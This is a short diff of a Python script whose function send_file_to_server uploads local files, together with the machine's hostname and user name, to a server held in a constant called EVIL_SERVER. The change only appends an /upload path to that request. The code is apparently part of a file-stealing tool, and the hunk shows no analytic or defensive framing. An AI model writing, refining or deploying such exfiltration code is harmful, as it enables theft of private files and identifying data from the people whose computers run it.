@@ -71,7 +71,7 @@ def send_file_to_server(file_path, hostname, user):
         with open(file_path, 'rb') as f:
             files = {'files': (file_path.split('\\')[-1], f)}
             data = {'hostname': hostname, 'user': user}
-            response = requests.post(EVIL_SERVER, files=files, data=data)
+            response = requests.post(f"{EVIL_SERVER}/upload", files=files, data=data)
             if response.status_code == 200:
                 print(f"[+] Sent: {file_path}")
                 return True
